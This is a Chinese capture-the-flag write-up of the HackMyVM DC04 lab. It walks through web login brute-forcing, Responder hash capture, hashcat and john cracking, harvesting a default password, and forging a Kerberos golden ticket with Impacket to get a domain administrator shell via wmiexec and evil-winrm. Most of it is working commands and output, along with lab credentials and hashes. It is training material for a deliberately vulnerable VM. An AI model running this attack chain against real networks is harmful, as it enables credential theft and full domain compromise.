---
title: HackMyVM-DC04
published: 2025-03-09 16:23:40
tags: [HackMyVM]
category: 靶机
draft: false
---

# DC04.

> [https://hackmyvm.eu/machines/machine.php?vm=DC04](https://hackmyvm.eu/machines/machine.php?vm=DC04)
> 

Notes: **Well, no more easy kakes. Hope you enjoy this one too.**

## 前期踩点

```bash
⚡ root@kali  ~/Desktop/test/listen11  nmap -sP 192.168.56.0/24                   
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-14 03:06 EST
Nmap scan report for 192.168.56.1
Host is up (0.00039s latency).
MAC Address: 0A:00:27:00:00:09 (Unknown)
Nmap scan report for 192.168.56.2
Host is up (0.00032s latency).
MAC Address: 08:00:27:F3:E1:79 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.126
Host is up (0.00068s latency).
MAC Address: 08:00:27:00:05:AB (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.4
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 2.03 seconds
```

```bash
 ⚡ root@kali  ~/Desktop/test/listen11  nmap -sT -min-rate 10000 -p- 192.168.56.126
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-14 03:06 EST
Nmap scan report for 192.168.56.126
Host is up (0.00084s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49668/tcp open  unknown
49674/tcp open  unknown
49687/tcp open  unknown
MAC Address: 08:00:27:00:05:AB (Oracle VirtualBox virtual NIC)
```

啥端口都有

```bash
⚡ root@kali  ~/Desktop/test/listen11  nmap -sT -A -T4 -O -p 80,135,139,445,389 192.168.56.126
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-14 03:10 EST
Nmap scan report for 192.168.56.126
Host is up (0.00061s latency).

PORT    STATE SERVICE       VERSION
80/tcp  open  http          Apache httpd 2.4.58 ((Win64) OpenSSL/3.1.3 PHP/8.2.12)
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
|_http-title: Did not follow redirect to http://soupedecode.local
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
445/tcp open  microsoft-ds?
MAC Address: 08:00:27:00:05:AB (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|11|2016 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (97%), Microsoft Windows 11 21H2 (91%), Microsoft Windows Server 2016 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-02-15T00:10:27
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:00:05:ab (Oracle VirtualBox virtual NIC)
|_clock-skew: 15h59m57s

TRACEROUTE
HOP RTT     ADDRESS
1   0.61 ms 192.168.56.126

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.09 seconds
```

扫出来域名，先将记录添加到`hosts`文件

```
⚡ root@kali  ~/Desktop/test/listen11  nmap -script=vuln -p 445,389,80,88 192.168.56.126
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-14 03:15 EST
Stats: 0:02:21 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.21% done; ETC: 03:18 (0:00:01 remaining)
Nmap scan report for SOUPEDECODE.LOCAL0 (192.168.56.126)
Host is up (0.00069s latency).                                                                  
                                                                                                
PORT    STATE SERVICE                                                                           
80/tcp  open  http                                                                              
|_http-trace: TRACE is enabled                                                                  
|_http-csrf: Couldn't find any CSRF vulnerabilities.                                                                                                                                            
| http-slowloris-check:    
|   VULNERABLE:                                                                                 
|   Slowloris DOS attack                                                                                                                                                                        
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750                                                                   
|       Slowloris tries to keep many connections to the target web server open and hold         
|       them open as long as possible.  It accomplishes this by opening connections to                                                                                                          
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.                                  
|                                                                                               
|     Disclosure date: 2009-09-17               
|     References:                               
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750                            
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.                                
|_http-dombased-xss: Couldn't find any DOM based XSS.                                           
| http-enum:                                    
|   /icons/: Potentially interesting folder w/ directory listing                                
|   /licenses/: Potentially interesting directory w/ listing on 'apache/2.4.58 (win64) openssl/3.1.3 php/8.2.12'     
|   /server-info/: Potentially interesting folder                                               
|_  /server-status/: Potentially interesting folder                                             
88/tcp  open  kerberos-sec
389/tcp open  ldap                              
445/tcp open  microsoft-ds
MAC Address: 08:00:27:00:05:AB (Oracle VirtualBox virtual NIC)                                  
                                                                                                                                                                                                
Host script results:                                                                            
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR                                                                                                
|_smb-vuln-ms10-054: false                                                                      
                                                                                                
Nmap done: 1 IP address (1 host up) scanned in 321.27 seconds
```

访问一下`HTTP`服务，所有请求都被`302`重定向了

![image.png](image%2090.png)

扫描一下网站目录，找一下不被重定向的页面

```bash
 ✘ ⚡ root@kali  ~/Desktop/test/listen11  gobuster dir -u 192.168.56.126 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,zip,txt,html -b 403,302,404,502
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.126
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404,502,403,302
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,zip,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/licenses             (Status: 301) [Size: 350] [--> http://192.168.56.126:8080/licenses/]
/examples             (Status: 503) [Size: 405]
/server-status        (Status: 200) [Size: 7928]
/server-info          (Status: 200) [Size: 7928]
Progress: 1038215 / 1038220 (100.00%)
===============================================================
Finished
===============================================================
```

访问`/server-info` ，其中找到了新的域名`heartbeat.soupedecode.local`

```bash
      54: <VirtualHost *:8080>
      55:   DocumentRoot "C:/xampp/htdocs/heartbeat"
      56:   ServerName heartbeat.soupedecode.local
      57:   <Directory "C:/xampp/htdocs/heartbeat">
      58:     AllowOverride All
        :   </Directory>
        : </VirtualHost>
```

访问`/server-status` 下面是可能有用的东西

```bash
Srv	PID	Acc	M	SS	Req	Dur	Conn	Child	Slot	Client	Protocol	VHost	Request
0-0	3372	0/16362/16362	_ 	697	0	92896	0.0	4.71	4.71 	127.0.0.1	http/1.1	localhost:8080	GET /t1651.html HTTP/1.1
0-0	3372	0/62075/62075	_ 	695	0	350501	0.0	17.88	17.88 	127.0.0.1	http/1.1	localhost:8080	GET /nt4stopc.php HTTP/1.1
0-0	3372	0/46681/46681	_ 	695	0	263264	0.0	13.44	13.44 	127.0.0.1	http/1.1	localhost:8080	GET /nt4stopc.html HTTP/1.1
0-0	3372	0/84562/84562	_ 	695	0	477235	0.0	24.35	24.35 	127.0.0.1	http/1.1	localhost:8080	GET /t1551.php HTTP/1.1
0-0	3372	0/65893/65893	_ 	787	0	375025	0.0	18.98	18.98 	127.0.0.1	http/1.1	localhost:8080	GET /0001015.html HTTP/1.1
0-0	3372	0/82531/82531	_ 	695	16	467965	0.0	23.77	23.77 	127.0.0.1	http/1.1	localhost:8080	GET /ntservpk.zip HTTP/1.1
0-0	3372	0/73861/73861	_ 	137	0	419075	0.0	21.27	21.27 	127.0.0.1	http/1.1	localhost:8080	GET /path/to/file HTTP/1.1
0-0	3372	0/81296/81296	W 	0	0	459644	0.0	23.49	23.49 	127.0.0.1	http/1.1	localhost:8080	GET /server-status HTTP/1.1
0-0	3372	0/79703/79703	_ 	695	0	458360	0.0	22.90	22.90 	127.0.0.1	http/1.1	localhost:8080	GET /nt4stopc.txt HTTP/1.1
0-0	3372	0/51959/51959	_ 	695	0	288538	0.0	14.91	14.91 	127.0.0.1	http/1.1	localhost:8080	GET /nt4stopc.zip HTTP/1.1
0-0	3372	0/81015/81015	_ 	695	14	458630	0.0	23.33	23.33 	127.0.0.1	http/1.1	localhost:8080	GET /t15526.html HTTP/1.1
0-0	3372	0/61233/61233	_ 	695	0	346801	0.0	17.64	17.64 	127.0.0.1	http/1.1	localhost:8080	GET /t1551.txt HTTP/1.1
0-0	3372	0/72400/72400	_ 	695	0	409416	0.0	20.85	20.85 	127.0.0.1	http/1.1	localhost:8080	GET /t1551.html HTTP/1.1
0-0	3372	0/66083/66083	_ 	734	0	376941	0.0	19.03	19.03 	127.0.0.1	http/1.1	localhost:8080	GET /securityad.zip HTTP/1.1
0-0	3372	0/76054/76054	_ 	695	0	434350	0.0	21.90	21.90 	127.0.0.1	http/1.1	localhost:8080	GET /t1551.zip HTTP/1.1
0-0	3372	0/75852/75852	_ 	696	0	431090	0.0	21.85	21.85 	127.0.0.1	http/1.1	localhost:8080	GET /t1843.zip HTTP/1.1
0-0	3372	0/62499/62499	_ 	787	0	354714	0.0	18.00	18.00 	127.0.0.1	http/1.1	localhost:8080	GET /sectest.zip HTTP/1.1
0-0	3372	0/86426/86426	_ 	701	0	491898	0.0	24.89	24.89 	127.0.0.1	http/1.1	localhost:8080	GET /99846.txt HTTP/1.1
```

访问新获得的域名`heartbeat.soupedecode.local` ，有一个登录框

![image.png](image%2091.png)

## Brute

没什么信息，尝试爆破，用户名指定`admin` ，失败的时候会返回`Invalid username or password.` 我们过滤掉带`Invalid` 的返回包（爆破次数多了之后好像服务会不正常，一直返回`404` 导致我要恢复快照）

![image.png](image%2092.png)

最后爆破出密码`nimde` （恢复了几次快照来着…）

![image.png](image%2093.png)

登陆进去出现 **`Network Share Heartbeat`** 的框框，让我们输入`ip`地址

![image.png](image%2094.png)

## NTLM relay

我们输入自己的`IP`然后使用`wireshark`进行抓包，能看见会触发`NBNS`的数据包

![image.png](image%2095.png)

那么第一时间想到的就是`NTLM relay`

```bash
✘ ⚡ root@kali  ~/Desktop/test/DC04  responder -I eth1 -wd                                    
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|
                                                
           NBT-NS, LLMNR & MDNS Responder 3.1.5.0
                                                
  To support this project:          
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder
                                                
  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C    
                                                
                                                
[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]  
    MDNS                       [ON]          
    DNS                        [ON]                                                             
    DHCP                       [ON]    
                                                                                                
[+] Servers:                             
    HTTP server                [ON]     
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [OFF]            
    SMB server                 [ON]        
    Kerberos server            [ON]   
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
```

然后在输入框输入我们的`IP` 然后点击`connect` ，就能捕获到`NET-NTLM hash` ，一般是用来破解，破解不出来的话就是进行`NTLM relay`攻击，但是在我们单台主机渗透的操作中，是无效的，因为`NTLM relay`攻击是不能重放到凭据真正持有者的主机

![image.png](image%2096.png)

我们使用`hashcat`将其进行爆破

```bash
 ⚡ root@kali  ~/Desktop/test/DC04  hashcat -h | grep NTLM  
   5500 | NetNTLMv1 / NetNTLMv1+ESS                                  | Network Protocol
  27000 | NetNTLMv1 / NetNTLMv1+ESS (NT)                             | Network Protocol
   5600 | NetNTLMv2                                                  | Network Protocol
  27100 | NetNTLMv2 (NT)                                             | Network Protocol
   1000 | NTLM                                                       | Operating System
```

```bash
 ⚡ root@kali  ~/Desktop/test/DC04  hashcat -m 5600 'websvc::soupedecode:784a7be8df22a16f:1FE1FEC178ED7B18FA89DC16CDE89488:0101000000000000009A9D509E7EDB01C216B1F03DB493F10000000002000800370033004C00490001001E00570049004E002D00490031004B004E00460055004B00440052004600310004003400570049004E002D00490031004B004E00460055004B0044005200460031002E00370033004C0049002E004C004F00430041004C0003001400370033004C0049002E004C004F00430041004C0005001400370033004C0049002E004C004F00430041004C0007000800009A9D509E7EDB01060004000200000008003000300000000000000000000000004000000C359CCD8231F583E880A5BB37086129D25FBB6C514ED014EEA3D775A8FC2F8F0A001000000000000000000000000000000000000900220063006900660073002F003100390032002E003100360038002E00350036002E0034000000000000000000' /usr/share/wordlists/rockyou.txt 
```

![image.png](image%2097.png)

爆破出来密码`jordan23` 用户名`websvc`

![image.png](image%2098.png)

## SMB 信息收集

尝试进行远程登陆，但是失败了，应该是没有权限，但是能注意到服务器上还开有`SMB`等服务

```bash
 ⚡ root@kali  ~/Desktop/test/DC04  smbclient -L 192.168.56.126 -U SOUPEDECODE.LOCAL/websvc%jordan23 
session setup failed: NT_STATUS_PASSWORD_EXPIRED
```

密码过期了，将新密码修改为`jordan123`

```
 ⚡ root@kali  ~/Desktop/test/DC04  smbclient -L 192.168.56.126 -U SOUPEDECODE.LOCAL/websvc%jordan123

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C               Disk
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        SYSVOL          Disk      Logon server share
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.56.126 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

在`websvc`用户的家目录可以找到`UserFlag` 

```bash
smb: \users\> ls
  .                                  DR        0  Wed Nov  6 20:55:53 2024
  ..                                DHS        0  Tue Nov  5 18:30:29 2024
  Administrator                       D        0  Sat Jun 15 15:56:40 2024
  All Users                       DHSrn        0  Sat May  8 04:26:16 2021
  Default                           DHR        0  Sat Jun 15 22:51:08 2024
  Default User                    DHSrn        0  Sat May  8 04:26:16 2021
  desktop.ini                       AHS      174  Sat May  8 04:14:03 2021
  fjudy998                            D        0  Wed Nov  6 20:55:33 2024
  ojake987                            D        0  Wed Nov  6 20:55:16 2024
  Public                             DR        0  Sat Jun 15 13:54:32 2024
  rtina979                            D        0  Wed Nov  6 20:54:39 2024
  websvc                              D        0  Wed Nov  6 20:44:11 2024
  xursula991                          D        0  Wed Nov  6 20:55:28 2024

                12942591 blocks of size 4096. 10834983 blocks available
```

```bash
smb: \Users\websvc\Desktop\> dir
  .                                  DR        0  Thu Nov  7 14:08:21 2024
  ..                                  D        0  Wed Nov  6 20:44:11 2024
  user.txt                            A       32  Thu Nov  7 05:07:55 2024

                12942591 blocks of size 4096. 10835331 blocks available
smb: \Users\websvc\Desktop\> mget user.txt
Get file user.txt? y
getting file \Users\websvc\Desktop\user.txt of size 32 as user.txt (0.9 KiloBytes/sec) (average 0.9 KiloBytes/sec)
```

```bash
 ⚡ root@kali  ~/Desktop/test/DC04  cat user.txt                 
709e449a996a85aa7deaf18c79515d6a      
```

并且`rtina979` 用户的家目录不能进入，那么这个可能就是突破口了，因为`135`端口，尝试使用`RPC`来获取枚举用户信息，并将`rtina979`用户的信息过滤出来

耶？将它的默认密码也给爆出来了`Z~l3JhcV#7Q-1#M` ,密码也过期了，将其改为了`jordan234`

```bash
 ⚡ root@kali  ~/Desktop/test/DC04  rpcclient -U SOUPEDDECODE.LOCAL/websvc%jordan123 192.168.56.126 -c "querydispinfo" | grep rtina979
index: 0x131f RID: 0x7fd acb: 0x00020010 Account: rtina979      Name: Reed Tina Desc: Default Password Z~l3JhcV#7Q-1#M
```

使用其再检索`SMB`的信息

```bash
 ⚡ root@kali  ~/Desktop/test/DC04  netexec smb 192.168.56.126 -u rtina979 -p jordan234 --shares
SMB         192.168.56.126  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         192.168.56.126  445    DC01             [+] SOUPEDECODE.LOCAL\rtina979:jordan234 
SMB         192.168.56.126  445    DC01             [*] Enumerated shares
SMB         192.168.56.126  445    DC01             Share           Permissions     Remark
SMB         192.168.56.126  445    DC01             -----           -----------     ------
SMB         192.168.56.126  445    DC01             ADMIN$                          Remote Admin
SMB         192.168.56.126  445    DC01             C               READ            
SMB         192.168.56.126  445    DC01             C$                              Default share
SMB         192.168.56.126  445    DC01             IPC$            READ            Remote IPC
SMB         192.168.56.126  445    DC01             NETLOGON        READ            Logon server share 
SMB         192.168.56.126  445    DC01             SYSVOL          READ            Logon server share 
```

发现一个 `Report.rar` 压缩包，下载之后发现需要密码，

```bash
smb: \Users\rtina979\Documents\> ls
  .                                  DR        0  Thu Nov  7 17:35:52 2024
  ..                                  D        0  Wed Nov  6 20:54:39 2024
  My Music                        DHSrn        0  Wed Nov  6 20:54:39 2024
  My Pictures                     DHSrn        0  Wed Nov  6 20:54:39 2024
  My Videos                       DHSrn        0  Wed Nov  6 20:54:39 2024
  Report.rar                          A   712046  Thu Nov  7 08:35:49 2024

                12942591 blocks of size 4096. 11014679 blocks available
smb: \Users\rtina979\Documents\> get Report.rar 
getting file \Users\rtina979\Documents\Report.rar of size 712046 as Report.rar (26744.4 KiloBytes/sec) (average 26744.5 KiloBytes/sec)
```

使用`john`对其破解密码

```bash
⚡ root@kali  ~/Desktop/test/DC04  rar2john Report.rar > hash
⚡ root@kali  ~/Desktop/test/DC04  cat hash         
Report.rar:$rar5$16$7b74f4c32feb807c16edc906c283e524$15$872f8d1a914bd1503dac110c7bbb938a$8$3e15430028d503b5
⚡ root@kali  ~/Desktop/test/DC04  john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (RAR5 [PBKDF2-SHA256 256/256 AVX2 8x])
Cost 1 (iteration count) is 32768 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
PASSWORD123      (Report.rar)     
1g 0:00:01:29 DONE (2025-02-14 07:27) 0.01115g/s 573.9p/s 573.9c/s 573.9C/s chitra..2pac4ever
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

得到密码`PASSWORD123` ，解压是一个`html`文件，是对目标编辑进行渗透测试的报告

![image.png](image%2099.png)

我么从中获取一些有用的信息

```bash
file_svc:Password123!!

RID cycling:
DC01$, boliver0, zximena1, emark2, isam3, wulysses4, etc.

SMB 192.168.56.121 445 DC01 [+] soupedecode.local\ybob317:ybob317

SMB 192.168.56.121 445 DC01 [+] soupedecode.local\FileServer$:9e564...SNIP...500 (Pwn3d!)

SMB         192.168.56.126  445    DC01             krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0f55cdc40bd8f5814587f7e6b2f85e6f:::

```

上面几个用户都测试过了密码都是假的，但是可以注意到下面的用户`hash` 存在`krbtgt`用户

```bash
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0f55cdc40bd8f5814587f7e6b2f85e6f:::
```

验证一下`kebtgt`用户，是正确的

```bash
 ⚡ root@kali  ~/Desktop/test/DC04  netexec smb 192.168.56.126 -u krbtgt -H 0f55cdc40bd8f5814587f7e6b2f85e6f
SMB         192.168.56.126  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         192.168.56.126  445    DC01             [-] SOUPEDECODE.LOCAL\krbtgt:0f55cdc40bd8f5814587f7e6b2f85e6f STATUS_ACCOUNT_DISA
```

![image.png](image%20100.png)

## 黄金票据

黄金票据是指能够绕过认证授权（`Authentication and Authorization`）机制并获得所需权限的票据。这种票据可以被攻击者收集和利用，从而从系统内部获取高权限，甚至完全控制系统

我们现在要获取： 域名称，域的`SID`值，域的`KRBTGT`账号的`HASH`，伪造任意用户名

1. 域`SID`
    
    ```bash
    ⚡ root@kali  ~/Desktop/test/DC04  lookupsid.py 'SOUPEDECODE.LOCAL/websvc:jordan123@192.168.56.126' | grep SID
    [*] Brute forcing SIDs at 192.168.56.126
    [*] Domain SID is: S-1-5-21-2986980474-46765180-2505414164
    ```
    
    `S-1-5-21-2986980474-46765180-2505414164`
    
2. `KRBTGT`账号的`HASH`
    
    上面已经给了也就是`0f55cdc40bd8f5814587f7e6b2f85e6f`
    
3. 和域同步时间
    
    ```bash
    ⚡ root@kali  ~/Desktop/test/DC04  ntpdate -n SOUPEDECODE.LOCAL
    ⚡ root@kali  ~/Desktop/test/DC04  ntpdate -u 192.168.56.126
    ```
    
4. 生成黄金票据
    
    ```bash
     ⚡ root@kali  ~/Desktop/test/DC04  ticketer.py -nthash 0f55cdc40bd8f5814587f7e6b2f85e6f -domain SOUPEDECODE.LOCAL -domain-sid S-1-5-21-2986980474-46765180-2505414164 administrator
    Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
    
    [*] Creating basic skeleton ticket and PAC Infos
    /root/.local/bin/ticketer.py:141: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
      aTime = timegm(datetime.datetime.utcnow().timetuple())
    [*] Customizing ticket for SOUPEDECODE.LOCAL/administrator
    /root/.local/bin/ticketer.py:600: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
      ticketDuration = datetime.datetime.utcnow() + datetime.timedelta(hours=int(self.__options.duration))
    /root/.local/bin/ticketer.py:718: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
      encTicketPart['authtime'] = KerberosTime.to_asn1(datetime.datetime.utcnow())
    /root/.local/bin/ticketer.py:719: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
      encTicketPart['starttime'] = KerberosTime.to_asn1(datetime.datetime.utcnow())
    [*]     PAC_LOGON_INFO
    [*]     PAC_CLIENT_INFO_TYPE
    [*]     EncTicketPart
    /root/.local/bin/ticketer.py:843: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
      encRepPart['last-req'][0]['lr-value'] = KerberosTime.to_asn1(datetime.datetime.utcnow())
    [*]     EncAsRepPart
    [*] Signing/Encrypting final ticket
    [*]     PAC_SERVER_CHECKSUM
    [*]     PAC_PRIVSVR_CHECKSUM
    [*]     EncTicketPart
    [*]     EncASRepPart
    [*] Saving ticket in administrator.ccache
    ```
    
    ![image.png](image%20101.png)
    
5. 将票据导入环境变量
    
    ```bash
    export KRB5CCNAME=administrator.ccache 
    ```
    
6. PTT
    
    ```bash
    wmiexec.py soupedecode.local/administrator@dc01.soupedecode.local -k -target-ip 192.168.56.126
    ```
    

总的步骤就是（最好复制出来一起粘贴进去，否则可能会出现`[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`）：

```bash
ntpdate -n soupedecode.local
ntpdate -u 192.168.56.126
ticketer.py -nthash 0f55cdc40bd8f5814587f7e6b2f85e6f -domain SOUPEDECODE.LOCAL -domain-sid S-1-5-21-2986980474-46765180-2505414164 administrator
export KRB5CCNAME=administrator.ccache
wmiexec.py soupedecode.local/administrator@dc01.soupedecode.local -k -target-ip 192.168.56.126
```

![image.png](image%20102.png)

```bash
C:\Users\administrator\Desktop>type root.txt
1c66eabe105636d7e0b82ec1fa87cb7a
```

```bash
ntpdate -n soupedecode.local
ntpdate -u 192.168.56.126
ticketer.py -nthash 0f55cdc40bd8f5814587f7e6b2f85e6f -domain SOUPEDECODE.LOCAL -domain-sid S-1-5-21-2986980474-46765180-2505414164 administrator
export KRB5CCNAME=administrator.ccache
evil-winrm -i 192.168.56.126 -u administrator -r soupedecode.local -k -C administrator.ccache
```

## 使用evil-winrm

上面是使用`wmiexec` ,下面使用`evil-winrm` 

先看帮助，需要新建`/etc/krb5.conf` 文件（该文件是`Kerberos` 客户端配置文件，通常用于 `Linux` 和类 `Unix` 系统中，用于配置 `Kerberos` 客户端与 `Kerberos` 服务器（`KDC`）之间的通信）

```bash
    -r, --realm DOMAIN               Kerberos auth, it has to be set also in /etc/krb5.conf file using this format -> CONTOSO.COM = { kdc = fooserver.contoso.com }
```

添加以下内容

```bash
[libdefaults]
    default_realm = SOUPEDECODE.LOCAL

[realms]
    SOUPEDECODE.LOCAL = {
        kdc = dc01.soupedecode.local
        admin_server = dc01.soupedecode.local
    }

[domain_realm]
    soupedecode.local = SOUPEDECODE.LOCAL
    .soupedecode.local = SOUPEDECODE.LOCAL
```

```bash
ntpdate -u 192.168.56.126
ntpdate -n soupedecode.local
impacket-ticketer -nthash 0f55cdc40bd8f5814587f7e6b2f85e6f -domain-sid S-1-5-21-2986980474-46765180-2505414164 -domain soupedecode.local  administrator
export KRB5CCNAME=administrator.ccache
KRB5CCNAME=administrator.ccache   evil-winrm -i 192.168.56.126 -u administrator -r soupedecode.local
```

## 总结

更熟悉域渗透，学习通过`Linux`实现构造黄金票据，以及传递票据